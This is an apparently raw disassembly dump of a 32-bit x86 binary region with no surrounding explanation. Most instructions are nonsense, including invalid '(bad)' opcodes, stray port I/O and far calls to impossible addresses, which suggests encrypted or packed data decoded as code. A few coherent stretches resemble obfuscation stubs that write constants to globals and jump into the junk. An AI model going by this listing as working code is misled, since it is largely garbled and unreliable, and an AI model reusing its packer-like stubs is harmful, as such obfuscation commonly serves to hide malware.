  409795:	mov    WORD PTR [ebx+0x5577336d],ds
  40979b:	in     al,0xa7
  40979d:	fs cmp al,0x1a
  4097a0:	daa    
  4097a1:	out    dx,eax
  4097a2:	sbb    eax,0x1db394d4
  4097a7:	inc    edx
  4097a8:	add    esi,DWORD PTR [ebx+0x12]
  4097ab:	lahf   
  4097ac:	dec    esp
  4097ad:	jmp    0x4097e4
  4097af:	test   DWORD PTR [eax-0xb],0x35b513a6
  4097b6:	daa    
  4097b7:	cmp    DWORD PTR [edx],0x7638ba8f
  4097bd:	pop    es
  4097be:	adc    DWORD PTR [edx],edi
  4097c0:	hlt    
  4097c1:	clc    
  4097c2:	push   ds
  4097c3:	es push ecx
  4097c5:	xchg   ecx,eax
  4097c6:	and    al,0x8c
  4097c8:	popf   
  4097c9:	mov    ds:0x6ad35113,al
  4097ce:	xor    eax,0xf3313fd5
  4097d3:	xchg   edi,eax
  4097d4:	ss mov al,0xbf
  4097d7:	jns    0x40975f
  4097d9:	sub    DWORD PTR [ebp-0x7b],0x51
  4097dd:	int    0x95
  4097df:	or     eax,0xead966f3
  4097e4:	gs je  0x40985c
  4097e7:	mov    ecx,DWORD PTR [edx-0x1e90bcf1]
  4097ed:	rcr    DWORD PTR [edi+esi*2],0x3e
  4097f1:	imul   BYTE PTR [eax-0x3f]
  4097f4:	push   ecx
  4097f5:	fild   DWORD PTR [esi+edx*8+0x2e]
  4097f9:	(bad)  
  4097fa:	pop    esp
  4097fb:	pop    edx
  4097fc:	je     0x4097e2
  4097fe:	aas    
  4097ff:	dec    esi
  409800:	cs call 0x6f7b080f
  409806:	add    al,0x6f
  409808:	je     0x409860
  40980a:	lock (bad) 
  40980d:	push   edx
  40980e:	ror    DWORD PTR [edx+0x4ab4c3f2],0xbe
  409815:	loope  0x40988f
  409817:	ffreep st(6)
  409819:	ret    0xf7e3
  40981c:	outs   dx,BYTE PTR ds:[esi]
  40981d:	retf   0xfe50
  409820:	and    ch,BYTE PTR [edx+0x355e9475]
  409826:	xor    eax,0x803c5585
  40982b:	xor    esp,DWORD PTR [ecx+0x460d38d2]
  409831:	cmc    
  409832:	into   
  409833:	push   0xffffffcf
  409835:	lock les ebx,FWORD PTR [ebx+0x41]
  409839:	ds or  al,0x77
  40983c:	div    BYTE PTR [esi+eax*8+0x28]
  409840:	cmc    
  409841:	inc    ebx
  409842:	rcl    DWORD PTR [ecx],cl
  409844:	sub    DWORD PTR [eax-0xe],0x264ae9a5
  40984b:	icebp  
  40984c:	push   cs
  40984d:	sub    DWORD PTR [ebx+0x2a],edx
  409850:	cmp    esi,edi
  409852:	xchg   ebp,eax
  409853:	(bad)  
  409854:	push   cs
  409855:	in     eax,dx
  409856:	(bad)  
  409858:	ins    BYTE PTR es:[edi],dx
  409859:	and    DWORD PTR [ebp-0x3b],ebx
  40985c:	adc    BYTE PTR [ebx+esi*1+0x5d],bh
  409860:	sbb    dl,BYTE PTR [edi-0x4a]
  409863:	fdivr  DWORD PTR [ebp+0x141a4281]
  409869:	repnz xor bl,BYTE PTR [ebx]
  40986c:	bound  ecx,QWORD PTR [esi]
  40986e:	out    0xe9,eax
  409870:	jns    0x40986a
  409872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409873:	retf   
  409874:	xor    ah,BYTE PTR [esi+0x6c]
  409877:	pop    esi
  409878:	(bad)  
  409879:	pushf  
  40987a:	je     0x4098dc
  40987c:	cdq    
  40987d:	sbb    DWORD PTR [eax+0xf],edx
  409880:	mov    bh,0x9
  409882:	lahf   
  409883:	stc    
  409884:	mov    ebp,0xc5b01d25
  409889:	xor    DWORD PTR [edx+eax*4+0x34],0x49ba9a7e
  409891:	or     esi,DWORD PTR [eax]
  409893:	or     al,BYTE PTR [edx]
  409895:	lods   eax,DWORD PTR ds:[esi]
  409896:	inc    edi
  409897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409898:	mov    eax,0xb0074521
  40989d:	push   ecx
  40989e:	sar    WORD PTR [eax],1
  4098a1:	mov    cl,0x8a
  4098a3:	sti    
  4098a4:	aaa    
  4098a5:	xor    BYTE PTR [ebp-0x48e12d0c],0x49
  4098ac:	je     0x40991e
  4098ae:	sub    DWORD PTR [eax+0x21],eax
  4098b1:	out    0xde,eax
  4098b3:	lods   eax,DWORD PTR ds:[esi]
  4098b4:	fmul   DWORD PTR [ebx+edi*2]
  4098b7:	mov    es,WORD PTR [ecx-0x12]
  4098ba:	jl     0x409881
  4098bc:	loope  0x4098ee
  4098be:	mov    bh,0x7
  4098c0:	dec    esi
  4098c1:	sub    DWORD PTR [ebp-0x202e1582],ebp
  4098c7:	pop    ds
  4098c8:	loopne 0x409898
  4098ca:	mov    bh,0x3d
  4098cc:	push   ecx
  4098cd:	jbe    0x40986f
  4098cf:	sbb    BYTE PTR [edx],ch
  4098d1:	or     eax,0x860f59d5
  4098d6:	call   FWORD PTR [ecx]
  4098d8:	add    esp,DWORD PTR fs:[ebx-0x53e0992f]
  4098df:	xchg   ebp,eax
  4098e0:	xor    al,0x26
  4098e2:	sub    dh,bl
  4098e4:	jbe    0x409956
  4098e6:	fcmovnu st,st(5)
  4098e8:	call   0x698d:0xab71fc8b
  4098ef:	js     0x40993c
  4098f1:	cmc    
  4098f2:	or     bh,ch
  4098f4:	aaa    
  4098f5:	not    BYTE PTR [edx+0x29]
  4098f8:	fsubr  st(1),st
  4098fa:	push   ss
  4098fb:	xchg   ecx,eax
  4098fc:	cdq    
  4098fd:	or     esp,DWORD PTR ss:[ebx]
  409900:	fild   DWORD PTR [edx-0x35]
  409903:	jmp    0xb118cf2
  409908:	xchg   edi,eax
  409909:	lea    edx,[edi-0x4c]
  40990c:	rol    DWORD PTR [ebp+0xfad4135],1
  409912:	or     al,0x34
  409914:	xchg   al,ch
  409916:	stos   DWORD PTR es:[edi],eax
  409917:	add    BYTE PTR [eax+0x72bc5218],cl
  40991d:	mov    edx,DWORD PTR [ecx-0x5a]
  409920:	je     0x4098eb
  409922:	repz add BYTE PTR [ebx+ebp*2+0x6c003870],bh
  40992a:	push   esp
  40992b:	sub    DWORD PTR [edi],edi
  40992d:	push   eax
  40992e:	cmp    al,0x1a
  409930:	fs xchg ebp,eax
  409932:	inc    edi
  409933:	add    edx,DWORD PTR [ebx-0x5a]
  409936:	aam    0x8c
  409938:	xor    ebp,eax
  40993a:	fdiv   DWORD PTR [eax-0x10]
  40993d:	push   DWORD PTR [ebx]
  40993f:	xchg   ebx,eax
  409940:	aas    
  409941:	and    DWORD PTR [ebx-0x459b9502],ebx
  409947:	in     eax,dx
  409948:	rol    cl,cl
  40994a:	shr    cl,0x51
  40994d:	dec    ebx
  40994e:	xor    ah,BYTE PTR cs:[ebx-0x51b1d258]
  409955:	aam    0xf1
  409957:	cmp    edi,DWORD PTR [bx-0x2bc3]
  40995c:	xchg   BYTE PTR [edx],cl
  40995e:	jge    0x40996c
  409960:	mov    esp,ebp
  409962:	pushf  
  409963:	in     al,0xc5
  409965:	(bad)  
  409966:	sbb    bl,BYTE PTR [ebp+eax*1+0x40]
  40996a:	in     eax,0xa0
  40996c:	add    al,0xdf
  40996e:	ficomp DWORD PTR [eax+0x28baef5b]
  409974:	loopne 0x4099ea
  409976:	jbe    0x40992e
  409978:	(bad)  
  409979:	xchg   esi,eax
  40997a:	cmc    
  40997b:	inc    ebx
  40997c:	aaa    
  40997d:	xor    ecx,0xffffffa5
  409980:	adc    BYTE PTR [edx],ch
  409982:	arpl   cx,dx
  409984:	push   0xffffffde
  409986:	fadd   st,st(3)
  409988:	adc    BYTE PTR ds:0x22a62a62,0xc4
  40998f:	gs in  eax,0x34
  409992:	push   edx
  409993:	push   esp
  409994:	mov    dl,0xf8
  409996:	mov    ebp,0x3ffd17d7
  40999b:	push   ebx
  40999c:	inc    BYTE PTR [ecx-0x4b]
  40999f:	je     0x409964
  4099a1:	data16 jne 0x4099c1
  4099a4:	mov    cl,0xe5
  4099a6:	ins    BYTE PTR es:[edi],dx
  4099a7:	ins    DWORD PTR es:[edi],dx
  4099a8:	jg     0x409a0b
  4099aa:	mov    eax,ds:0xdc009b42
  4099af:	xor    bh,BYTE PTR [ecx]
  4099b1:	cld    
  4099b2:	push   ebx
  4099b3:	aad    0x1b
  4099b5:	xor    dl,BYTE PTR [edx+esi*1-0x733dcea6]
  4099bc:	lods   al,BYTE PTR ds:[esi]
  4099bd:	jp     0x409a2f
  4099bf:	lods   eax,DWORD PTR ds:[esi]
  4099c0:	sbb    al,0xb0
  4099c2:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4099c4:	gs push ecx
  4099c6:	mov    DWORD PTR ds:0x42a875,edx
  4099cc:	push   ecx
  4099cd:	mov    eax,0x5a3fc9f
  4099d2:	mov    DWORD PTR ds:0x42a885,0x49fb
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a875,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a7f9,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a779
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx+0x3cec14cf]
  409a19:	mov    ds:0xf7b61fd8,al
  409a1e:	js     0x409a98
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x409a8d
  409a25:	lock xchg ebp,eax
  409a27:	and    BYTE PTR es:[ebp-0x1889e264],bl
  409a2e:	sub    BYTE PTR [esp+eiz*8+0x38ffeddc],cl
  409a35:	jns    0x4099d8
  409a37:	aam    0xc4
  409a39:	sahf   
  409a3a:	repnz iret 
  409a3c:	test   al,0xab
  409a3e:	cmp    DWORD PTR [ecx+eiz*8],ebp
  409a41:	mov    BYTE PTR [ecx-0x6],dl
  409a44:	test   eax,0x93512d3d
  409a49:	or     al,0x8e
  409a4b:	scas   al,BYTE PTR es:[edi]
  409a4c:	stc    
  409a4d:	mov    dl,BYTE PTR [eax-0x5fa928b7]
  409a53:	cmp    al,0x7c
  409a55:	xor    al,0x44
  409a57:	adc    dh,0x5a
  409a5a:	out    0x39,eax
  409a5c:	inc    ebx
  409a5d:	mov    ds:0x19ebd2fe,al
  409a62:	jmp    0x409adc
  409a64:	pushf  
  409a65:	adc    BYTE PTR [eax+0x11164f1d],bh
  409a6b:	out    dx,eax
  409a6c:	jp     0x409abe
  409a6e:	and    al,0xe2
  409a70:	push   0x5b
  409a72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a73:	xchg   esp,eax
  409a74:	pop    ss
  409a75:	jecxz  0x409acf
  409a77:	mov    dl,0x1e
  409a79:	sbb    DWORD PTR [ebx],edi
  409a7b:	test   eax,0x3f72e8fd
  409a80:	mov    dl,0x22
  409a82:	sub    eax,0x23d9c889
  409a87:	in     eax,dx
  409a88:	pop    es
  409a89:	fidivr WORD PTR [ecx+0x8]
  409a8c:	hlt    
  409a8d:	fnstsw WORD PTR [edi]
  409a8f:	xor    DWORD PTR [edx+0x23],ebp
  409a92:	popf   
  409a93:	add    eax,0xe38e9211
  409a98:	mov    esi,0x9af7af67
  409a9d:	mov    esp,0xd68a6a64
  409aa2:	add    ebp,esi
  409aa4:	jne    0x409a9f
  409aa6:	cld    
  409aa7:	cmp    eax,0x978f177a
  409aac:	xorps  xmm2,xmm2
  409aaf:	xchg   esi,eax
  409ab0:	xor    eax,0x69db7828
  409ab5:	popa   
  409ab6:	fdivp  st(3),st
  409ab8:	mov    ds:0x11b7e120,eax
  409abd:	cmp    al,bh
  409abf:	jmp    0x6a778556
  409ac4:	add    eax,0x9cfe76b6
  409ac9:	mov    ds:0x420bc4e9,al
  409ace:	popa   
  409acf:	out    0xef,eax
  409ad1:	lea    esp,[esi]
  409ad3:	adc    dl,BYTE PTR [eax]
  409ad5:	or     al,0x8
  409ad7:	fninit 
  409ad9:	mov    ch,BYTE PTR [eax]
  409adb:	lods   al,BYTE PTR ds:[esi]
  409adc:	fadd   DWORD PTR [edx+0x779b9bc6]
  409ae2:	popf   
  409ae3:	lahf   
  409ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ae5:	add    al,BYTE PTR [edi-0x69]
  409ae8:	out    dx,al
  409ae9:	xchg   ecx,eax
  409aea:	dec    ebx
  409aeb:	cdq    
  409aec:	push   es
  409aed:	sub    DWORD PTR [ebp+0x1a],edi
  409af0:	sub    bl,BYTE PTR ds:0x3828ed7f
  409af6:	clc    
  409af7:	push   es
  409af8:	mov    bl,0xc0
  409afa:	sbb    DWORD PTR [esi+ebp*4+0x67],0x3a
  409aff:	mov    ds:0x77375db9,al
  409b04:	mov    ah,0x4f
  409b06:	fwait
  409b07:	lods   al,BYTE PTR ds:[esi]
  409b08:	ficom  DWORD PTR [esi-0xa]
  409b0b:	xor    eax,0xe9e1ccdb
  409b10:	xor    dh,bl
  409b12:	shl    eax,0x8e
  409b15:	ret    0x9b44
  409b18:	stos   BYTE PTR es:[edi],al
  409b19:	xor    DWORD PTR [esp+ebx*2+0x1206c198],ecx
  409b20:	arpl   WORD PTR [edx+0x14],cx
  409b23:	iret   
  409b24:	cmp    ebp,DWORD PTR [ecx-0x44d2a04f]
  409b2a:	or     al,0xb0
  409b2c:	test   al,0xc3
  409b2e:	ror    BYTE PTR [edx+0x1f],cl
  409b31:	push   ebx
  409b32:	adc    esi,ebx
  409b34:	dec    edi
  409b35:	xor    BYTE PTR [edi+0x0],0xad
  409b39:	shr    BYTE PTR [ecx],1
  409b3b:	jo     0x409b76
  409b3d:	inc    esi
  409b3e:	jnp    0x409b2c
  409b40:	sbb    bh,BYTE PTR [ebx+0x45]
  409b43:	pop    edx
  409b44:	or     cl,BYTE PTR [eax]
  409b46:	adc    al,0x8e
  409b48:	sti    
  409b49:	pop    ss
  409b4a:	daa    
  409b4b:	ss dec ebx
  409b4d:	addr16 fxch st(2)
  409b50:	push   edx
  409b51:	push   0x74
  409b53:	fadd   DWORD PTR [ebx]
  409b55:	stos   DWORD PTR es:[edi],eax
  409b56:	jecxz  0x409b21
  409b58:	dec    esp
  409b59:	cmp    esi,edi
  409b5b:	(bad)  
  409b5c:	push   0x1561c949
  409b61:	lods   eax,DWORD PTR ds:[esi]
  409b62:	pop    edi
  409b63:	xor    dh,BYTE PTR es:[eax]
  409b66:	sbb    ch,ch
  409b68:	call   0x4ecb:0xab0c99f7
  409b6f:	cld    
  409b70:	rcr    ah,0x49
  409b73:	fnstsw WORD PTR [edi-0x2a]
  409b76:	jl     0x409bbb
  409b78:	mov    bl,0xe
  409b7a:	push   esi
  409b7b:	lock dec ebp
  409b7d:	f2xm1  
  409b7f:	imul   BYTE PTR [ebx+ebx*8]
  409b82:	mov    edx,esi
  409b84:	std    
  409b85:	ret    
  409b86:	cli    
  409b87:	ror    BYTE PTR [ebp-0x1c],1
  409b8a:	andnps xmm4,XMMWORD PTR ds:0x83e21783
  409b91:	cmp    DWORD PTR [ecx+eiz*1],esi
  409b94:	lods   al,BYTE PTR ds:[esi]
  409b95:	inc    ecx
  409b96:	or     bh,ah
  409b98:	repz mov ebp,0x5955b417
  409b9e:	out    0x14,al
  409ba0:	sar    edx,cl
  409ba2:	mov    eax,ds:0xb13176bc
  409ba7:	call   0xe096bdfe
  409bac:	mov    eax,ds:0x56c14b37
  409bb1:	or     DWORD PTR [edx],esi
  409bb3:	scas   al,BYTE PTR es:[edi]
  409bb4:	jmp    0x409b87
  409bb6:	enter  0x519e,0x15
  409bba:	jo     0x409c1e
  409bbc:	gs jne 0x409bf0
  409bbf:	movnti DWORD PTR [ebp-0x59],ebp
  409bc3:	jno    0x409bff
  409bc5:	lods   eax,DWORD PTR ds:[esi]
  409bc6:	cld    
  409bc7:	(bad)  [eax]
  409bc9:	mov    ah,0xc
  409bcb:	xchg   esp,eax
  409bcc:	leave  
  409bcd:	es jle 0x409c17
  409bd0:	or     DWORD PTR [edx],eax
  409bd2:	lods   al,BYTE PTR ds:[esi]
  409bd3:	pop    ds
  409bd4:	xchg   esi,eax
  409bd5:	mov    dl,0xb7
  409bd7:	pusha  
  409bd8:	retf   
  409bd9:	xchg   ecx,eax
  409bda:	scas   al,BYTE PTR es:[edi]
  409bdb:	hlt    
  409bdc:	adc    BYTE PTR [ecx-0x4aab3efb],0x20
  409be3:	push   esi
  409be4:	test   al,0x0
  409be6:	fdivr  DWORD PTR ds:0x50a97ba3
  409bec:	je     0x409b8e
  409bee:	mov    ebp,0x41ad9ef6
  409bf3:	fisubr DWORD PTR [edx]
  409bf5:	mov    edi,0xad44dd2c
  409bfa:	in     al,0xc5
  409bfc:	cmp    ebp,esp
  409bfe:	add    BYTE PTR ds:0xed3d4afc,dl
  409c04:	sbb    BYTE PTR ds:0x927a5db,ch
  409c0a:	push   esp
  409c0b:	push   ecx
  409c0c:	sbb    eax,0x216a30ed
  409c11:	int3   
  409c12:	rol    BYTE PTR [ebp-0x6d],1
  409c15:	test   edx,edx
  409c17:	push   edx
  409c18:	stc    
  409c19:	jge    0x409c11
  409c1b:	xlat   BYTE PTR ds:[ebx]
  409c1c:	mov    es,WORD PTR [esp+ecx*1]
  409c1f:	outs   dx,BYTE PTR ds:[esi]
  409c20:	fdivr  QWORD PTR [eax+ebx*8]
  409c23:	adc    al,0x0
  409c25:	adc    al,0x93
  409c27:	sbb    dh,BYTE PTR [eax+ebx*2-0x1a]
  409c2b:	xchg   edx,eax
  409c2c:	jl     0x409c54
  409c2e:	fnsave [edi-0x5b]
  409c31:	or     DWORD PTR [esp+esi*2],edi
  409c34:	outs   dx,BYTE PTR ds:[esi]
  409c35:	push   ss
  409c36:	in     al,0xb5
  409c38:	outs   dx,BYTE PTR ds:[esi]
  409c39:	ror    DWORD PTR [eax],cl
  409c3b:	outs   dx,DWORD PTR ds:[esi]
  409c3c:	lea    ecx,[ebp+edx*2-0x503077b3]
  409c43:	mov    ah,0xd0
  409c45:	jmp    0xcd96ed4b
  409c4a:	lahf   
  409c4b:	popa   
  409c4c:	dec    ebp
  409c4d:	pushf  
  409c4e:	and    eax,0x9c54ce30
  409c53:	mov    esp,0xa511dd74
  409c58:	sub    cl,BYTE PTR ds:0x54f096e0
  409c5e:	stos   DWORD PTR es:[edi],eax
  409c5f:	jbe    0x409c15
  409c61:	cmp    al,0x15
  409c63:	xchg   esi,eax
  409c64:	xchg   BYTE PTR [edx+0x62701d86],ch
  409c6a:	add    DWORD PTR [esi+ebx*8+0x47],esi
  409c6e:	mov    ds:0x6d8e8581,al
  409c73:	pop    ds
  409c74:	in     al,0x79
  409c76:	inc    ebx
  409c77:	js     0x409c61
  409c79:	inc    esi
  409c7a:	arpl   WORD PTR ds:0xaa123aef,ax
  409c80:	or     al,0x96
  409c82:	push   ss
  409c83:	dec    esp
  409c84:	iret   
  409c85:	jg     0x409c97
  409c87:	jge    0x409c64
  409c89:	jo     0x409cf0
  409c8b:	or     ebx,DWORD PTR [eax+0x2e]
  409c8e:	neg    ebx
  409c90:	xchg   ebp,eax
  409c91:	xchg   ecx,eax
  409c92:	clc    
  409c93:	mov    dl,0x71
  409c95:	add    ecx,DWORD PTR [ecx-0x592660d9]
  409c9b:	cmc    
  409c9c:	jg     0x409c41
  409c9e:	cmp    al,0x25
  409ca0:	fisttp QWORD PTR [esi]
  409ca2:	lahf   
  409ca3:	xchg   ebp,eax
  409ca4:	fcomp  QWORD PTR [ebx-0x7c]
  409ca7:	fmul   DWORD PTR [ecx]
  409ca9:	dec    ebx
  409caa:	(bad)  
  409cab:	jecxz  0x409cb8
  409cad:	dec    edi
  409cae:	push   ecx
  409caf:	addr16 aam 0x77
  409cb2:	test   ch,0x4d
  409cb5:	add    al,BYTE PTR [eax]
  409cb7:	inc    esp
  409cb8:	hlt    
  409cb9:	and    edi,0xffffffd4
  409cbc:	popa   
  409cbd:	inc    ecx
  409cbe:	jno    0x409cef
  409cc0:	dec    esp
  409cc1:	pop    edi
  409cc2:	push   eax
  409cc3:	jb     0x409c85
  409cc5:	adc    BYTE PTR [eax+0x182838b2],bl
  409ccb:	es and eax,0xda040c46
  409cd1:	adc    BYTE PTR [edx-0x7c],al
  409cd4:	jmp    0x118fcb69
  409cd9:	xchg   ebp,eax
  409cda:	ja     0x409ce8
  409cdc:	mov    BYTE PTR [eax-0x6f],ch
  409cdf:	mov    ebx,0xe44d9953
  409ce4:	(bad)  
  409ce6:	out    0xcd,eax
  409ce8:	xchg   edi,eax
  409ce9:	mov    esp,0x672b3e04
  409cee:	fld    DWORD PTR es:[ebx+0x3751866f]
  409cf5:	loop   0x409cae
  409cf7:	test   BYTE PTR [esi+0x458b668a],0xf8
  409cfe:	sbb    DWORD PTR ds:0x42a779,0x42a805
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a77d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a841,0x42a83d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a831,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi+0x5edb03d7],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409ce7
  409d66:	lds    esi,FWORD PTR [eax+ecx*1-0x3a8193d8]
  409d6d:	add    BYTE PTR [ecx-0x686d8fa9],cl
  409d73:	cwde   
  409d74:	jmp    0x409dd7
  409d76:	les    esi,FWORD PTR [edi-0x9fb23c3]
  409d7c:	add    bh,BYTE PTR [edx+0x75]
  409d7f:	int3   
  409d80:	call   0x14e9c480
  409d85:	xchg   edi,eax
  409d86:	ds or  al,0x14
  409d89:	out    dx,al
  409d8a:	sub    eax,0x6855752
  409d8f:	xor    al,0x12
  409d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d92:	lds    ebx,FWORD PTR [ecx-0x28]
  409d95:	fcmovnbe st,st(4)
  409d97:	mov    edi,0x3b756076
  409d9c:	stc    
  409d9d:	retf   0x9f7
  409da0:	mov    esp,0x327da9fe
  409da5:	jns    0x409e18
  409da7:	dec    ecx
  409da8:	mov    esi,0x4242d189
  409dad:	mov    ebp,DWORD PTR [esi]
  409daf:	pop    esp
  409db0:	jmp    0x409deb
  409db2:	nop
  409db3:	cmp    ebp,esp
  409db5:	jo     0x409d59
  409db7:	xchg   ebx,eax
  409db8:	xchg   esp,eax
  409db9:	mov    cl,0x65
  409dbb:	push   es
  409dbc:	jp     0x409e0c
  409dbe:	sub    DWORD PTR [ebx-0x161c2885],eax
  409dc4:	mov    eax,ds:0xa99890b2
  409dc9:	das    
  409dca:	enter  0x3a00,0xdb
  409dce:	xor    al,0x1d
  409dd0:	xchg   edx,eax
  409dd1:	sbb    eax,0xa6e5c1ad
  409dd6:	sahf   
  409dd7:	dec    ebp
  409dd8:	inc    esp
  409dd9:	nop
  409dda:	add    al,cl
  409ddc:	in     eax,dx
  409ddd:	mov    ds:0xb7667b79,al
  409de2:	and    BYTE PTR [ebp-0x63dbf896],dh
  409de8:	mov    ds:0xf03dd4da,al
  409ded:	mov    ebx,0xd4034eea
  409df2:	pop    edx
  409df3:	stos   DWORD PTR es:[edi],eax
  409df4:	ins    DWORD PTR es:[edi],dx
  409df5:	sti    
  409df6:	cli    
  409df7:	lock mov dl,0x14
  409dfa:	and    al,0xe
  409dfc:	add    al,0x86
  409dff:	xchg   ebp,eax
  409e00:	pop    ebp
  409e01:	stos   BYTE PTR es:[edi],al
  409e02:	xor    dh,BYTE PTR [ecx+0x16]
  409e05:	retf   
  409e06:	bound  ebp,QWORD PTR [eax+0x2f91a7bb]
  409e0c:	jae    0x409e85
  409e0e:	inc    esi
  409e0f:	mov    bl,BYTE PTR [esi+0x3b694dc5]
  409e15:	repz dec edx
  409e17:	jg     0x409e42
  409e19:	push   0xffffffec
  409e1b:	and    al,0x37
  409e1d:	(bad)  
  409e1e:	out    dx,al
  409e1f:	add    al,0x72
  409e21:	xchg   BYTE PTR [ebx],bh
  409e23:	dec    edx
  409e24:	jns    0x409dde
  409e26:	(bad)  
  409e27:	ins    BYTE PTR es:[edi],dx
  409e28:	jmp    0x409df7
  409e2a:	add    DWORD PTR [ecx-0x7a8ff9c2],0xec241d65
  409e34:	retf   
  409e35:	jno    0x409eb3
  409e37:	dec    esp
  409e38:	mov    ecx,0x3c391324
  409e3d:	push   ebx
  409e3e:	xchg   DWORD PTR [ecx],edi
  409e40:	adc    BYTE PTR [ebx+0x5820d171],dl
  409e46:	ins    DWORD PTR es:[edi],dx
  409e47:	out    dx,eax
  409e48:	mov    WORD PTR [edi-0x406b4aa],ds
  409e4e:	mov    eax,0x1132e824
  409e53:	adc    esp,DWORD PTR [edi+0x20]
  409e56:	mov    bl,0x27
  409e58:	add    BYTE PTR [esi+0x23],cl
  409e5b:	daa    
  409e5c:	or     al,bh
  409e5e:	jb     0x409e30
  409e60:	das    
  409e61:	daa    
  409e62:	jae    0x409e14
  409e64:	and    al,0x8b
  409e66:	mov    ah,BYTE PTR [eax+0x1548d215]
  409e6c:	inc    edi
  409e6d:	mov    ecx,0xc903401a
  409e72:	mov    edi,0x497c206d
  409e77:	add    eax,0x5a6a374b
  409e7c:	ins    BYTE PTR es:[edi],dx
  409e7d:	sti    
  409e7e:	test   BYTE PTR [eax+eax*1+0x70],0x63
  409e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e84:	fcom   DWORD PTR [ebx]
  409e86:	aaa    
  409e87:	xchg   edx,eax
  409e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e89:	mov    dl,BYTE PTR [eax+0x225d7450]
  409e8f:	mov    cl,0xfe
  409e91:	pop    es
  409e92:	(bad)  
  409e94:	jns    0x409e94
  409e96:	ins    DWORD PTR es:[edi],dx
  409e97:	xlat   BYTE PTR ds:[ebx]
  409e98:	mov    al,ds:0x6205d1bb
  409e9d:	fs stos BYTE PTR es:[edi],al
  409e9f:	int3   
  409ea0:	dec    esi
  409ea1:	dec    edi
  409ea2:	push   eax
  409ea3:	mov    eax,ds:0xa07976f9
  409ea8:	sub    eax,0xf265c2ab
  409ead:	enter  0x3de9,0x92
  409eb1:	sbb    ch,BYTE PTR [edx+0x2e104ac5]
  409eb7:	daa    
  409eb8:	test   ecx,0x18fffb8
  409ebe:	movnti DWORD PTR [edx-0x59959350],ebp
  409ec5:	lock jne 0x409ef6
  409ec8:	lods   eax,DWORD PTR ss:[esi]
  409eca:	and    dh,BYTE PTR [eax+0x63c809a2]
  409ed0:	int3   
  409ed1:	jl     0x409f0d
  409ed3:	mov    edi,0x8bbdcdd0
  409ed8:	icebp  
  409ed9:	ret    0x6e96
  409edc:	mov    ecx,0x6e2c0ae0
  409ee1:	xor    eax,0xf5fc5db7
  409ee6:	adc    ebx,DWORD PTR [ebx+ecx*1]
  409ee9:	push   ebp
  409eea:	cmp    al,0x88
  409eec:	dec    esp
  409eed:	lods   eax,DWORD PTR ds:[esi]
  409eee:	cld    
  409eef:	call   0xdd9:0x62e7dd8d
  409ef6:	pop    edx
  409ef7:	je     0x409f02
  409ef9:	xor    DWORD PTR [eax+ecx*8+0x1acfc19a],eax
  409f00:	clc    
  409f01:	jae    0x409f4c
  409f03:	(bad)  
  409f04:	call   0xf94d:0xc5ac
  409f0a:	xchg   ecx,eax
  409f0b:	push   0xe45d919a
  409f10:	iret   
  409f11:	mov    ah,0x84
  409f13:	lahf   
  409f14:	dec    esi
  409f15:	sti    
  409f16:	and    al,0xf5
  409f18:	mov    ecx,0x30a9bb61
  409f1d:	mov    edi,0x72a18fef
  409f22:	xor    DWORD PTR [edx+0x6ad0e4c7],ebx
  409f28:	stc    
  409f29:	push   esp
  409f2a:	das    
  409f2b:	enter  0xd58,0x8
  409f2f:	xchg   ebp,eax
  409f30:	ja     0x409ef6
  409f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f33:	sbb    bl,BYTE PTR [edx]
  409f35:	retf   0x3f4d
  409f38:	sub    eax,0xa0534948
  409f3d:	mov    esi,0xa7da5a5c
  409f42:	lds    edi,FWORD PTR [edi+0x430fefc0]
  409f48:	retf   0xb255
  409f4b:	mov    DWORD PTR [edi+0x5c031ae4],edx
  409f51:	push   ebp
  409f52:	shr    edx,1
  409f54:	repnz adc al,0xc9
  409f57:	lahf   
  409f58:	hlt    
  409f59:	test   BYTE PTR [eax],0x1b
  409f5c:	cmc    
  409f5d:	jno    0x409f5c
  409f5f:	aaa    
  409f60:	icebp  
  409f61:	or     dl,BYTE PTR [edi]
  409f63:	aam    0xde
  409f65:	jbe    0x409f59
  409f67:	jl     0x409f45
  409f69:	add    BYTE PTR [ecx-0x10],dh
  409f6c:	bound  eax,QWORD PTR [esi]
  409f6e:	outs   dx,DWORD PTR ds:[esi]
  409f6f:	(bad)  
  409f70:	xchg   edi,eax
  409f71:	sub    ebx,DWORD PTR [ecx-0x4cca3c72]
  409f77:	aad    0xe5
  409f79:	adc    eax,0xc7139ab5
